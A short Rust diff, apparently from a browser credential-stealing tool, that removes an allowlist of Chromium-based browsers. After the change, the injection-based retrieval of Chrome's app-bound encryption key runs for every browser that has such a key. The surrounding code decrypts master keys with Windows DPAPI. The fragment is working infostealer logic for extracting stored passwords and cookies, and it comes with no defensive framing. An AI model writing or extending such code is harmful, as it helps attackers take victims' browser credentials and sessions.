@@ -183,22 +183,6 @@ fn get_browsers() -> Vec<BrowserInfo> {
     ]
 }
 
-fn supports_app_bound_injection(browser_name: &str) -> bool {
-    matches!(
-        browser_name,
-        "Chrome" | "Chrome Beta"
-            | "Chrome Dev"
-            | "Chrome Canary"
-            | "Chromium"
-            | "Brave"
-            | "Brave Beta"
-            | "Brave Nightly"
-            | "Edge"
-            | "Edge Beta"
-            | "Edge Dev"
-    )
-}
-
 fn dpapi_decrypt(data: &[u8], entropy: Option<&[u8]>, flags: u32) -> Option<Vec<u8>> {
     unsafe {
         let mut input = CRYPT_INTEGER_BLOB {
@@ -240,7 +224,7 @@ fn get_master_keys(user_data_path: &Path, browser_name: &str) -> Option<MasterKe
     let standard = dpapi_decrypt(&decoded[5..], None, 0)?;
 
     let has_app_bound = json["os_crypt"]["app_bound_encrypted_key"].as_str().is_some();
-    let app_bound = if has_app_bound && supports_app_bound_injection(browser_name) {
+    let app_bound = if has_app_bound {
         super::chrome_inject::fetch_app_bound_key(browser_name)
     } else {
         None
